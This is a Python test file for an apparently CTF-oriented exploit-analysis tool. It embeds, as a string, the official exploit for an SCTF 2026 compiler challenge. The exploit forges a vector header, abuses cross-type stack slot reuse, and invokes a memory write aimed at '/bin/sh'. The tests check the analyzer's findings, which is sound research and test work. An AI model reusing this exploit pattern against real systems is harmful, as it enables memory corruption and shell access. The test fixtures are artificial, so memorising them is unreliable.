import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
AUTOCORRECT = ROOT / "autocorrect"
PROJECT = ROOT / "pwncraft"
for path in (AUTOCORRECT, PROJECT):
    if str(path) not in sys.path:
        sys.path.insert(0, str(path))

from challenge_intake import load_splits, split_for_case
from pwncraft.features.audit.embedded_compiler import EmbeddedCompilerPolicy
from pwncraft.features.audit.semantic_facts import analyze_exp_semantics

CASE_ID = "memory_write-sctf-2026-slang-a31e8aa0"
TRUTH = ROOT / "autocorrect" / "cases" / CASE_ID / "expected_truth_cycle16.json"

OFFICIAL_EXP_SHAPE = r'''PAYLOAD = r''' + "'''" + r'''function one() : -> int {
  return 1;
}

function forge() : -> str {
  return "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7f";
}

function pwn(int round, vec forged_vec) : -> void {
  if (round == 0) {
    return;
  };
  say("resolve puts");
  scribble(forged_vec, 526339, -205200);
  say("/bin/sh");
  return;
}

function main() : int round, int keep_marker, vec vec_slot, str forged_header -> int {
  vec_slot := vec_new(0);
  round := 0;
  keep_vec(vec_slot);

  do {
    pwn(round, vec_slot);
    forged_header := forge();
    keep_marker := one() + 1234;
    round := round + 1;
  } while (round < 2);

  keep_str(forged_header);
  keep_int(keep_marker);
  return 0;
}
''' + "'''" + r'''

def main():
    source = PAYLOAD + "END_OF_SOURCE\n"
    sock.sendall(source.encode())
'''


def _truth() -> dict:
    return json.loads(TRUTH.read_text(encoding="utf-8"))


def _policy() -> EmbeddedCompilerPolicy:
    raw = _truth()["reviewed_compiler_policy"]
    return EmbeddedCompilerPolicy(
        name=raw["name"],
        skip_loop_void_call_arguments_in_liveness=raw[
            "skip_loop_void_call_arguments_in_liveness"
        ],
        codegen_preserves_call_arguments=raw["codegen_preserves_call_arguments"],
        slot_allocator=raw["slot_allocator"],
        provenance=raw["provenance"],
    )


def _main_compiler_fact(result: dict) -> dict:
    compiler = result["embedded_compiler_semantics"][0]
    return next(item for item in compiler["functions"] if item["function"] == "main")


def test_truth_revision_three_is_locked_to_official_sctf_materials() -> None:
    assert split_for_case(CASE_ID, load_splits()) == "train"
    truth = _truth()
    assert truth["truth_lock"]["truth_revision"] == 3
    assert truth["truth_lock"]["supersedes"] == \
        "truth-sctf2026-slang-embedded-structure-v2"
    assert truth["materials"]["official_writeup_git_blob_sha1"] == \
        "f6d4a55258e8cd64fe31565eb3ce8fa7de7b1ab9"


def test_official_loop_void_call_produces_reviewed_liveness_omission() -> None:
    result = analyze_exp_semantics(
        OFFICIAL_EXP_SHAPE, embedded_compiler_policy=_policy()
    )
    assert result["status"] == "ok"
    main = _main_compiler_fact(result)
    omission = next(item for item in main["liveness_omissions"] if item["callee"] == "pwn")
    assert omission["variables"] == ["round", "vec_slot"]
    assert omission["codegen_preserves_arguments"] is True
    assert omission["provenance"] == "OFFICIAL_WRITEUP_REVIEWED_POLICY"


def test_reviewed_policy_reconstructs_official_vec_to_str_slot_reuse() -> None:
    result = analyze_exp_semantics(
        OFFICIAL_EXP_SHAPE, embedded_compiler_policy=_policy()
    )
    main = _main_compiler_fact(result)
    relation = next(
        item for item in main["slot_reuse_relations"]
        if item["from_variable"] == "vec_slot" and item["to_variable"] == "forged_header"
    )
    assert relation["slot"] == 0
    assert relation["from_type"] == "vec"
    assert relation["to_type"] == "str"
    assert relation["cross_type"] is True


def test_cycle16_still_stops_before_runtime_type_confusion_and_write_primitive() -> None:
    result = analyze_exp_semantics(
        OFFICIAL_EXP_SHAPE, embedded_compiler_policy=_policy()
    )
    assert result["embedded_compiler_semantics"]
    assert result["primitives"] == []
    truth = _truth()
    assert "automatic loop-iteration value-flow proof is not implemented in this cycle" in truth["unknown"]
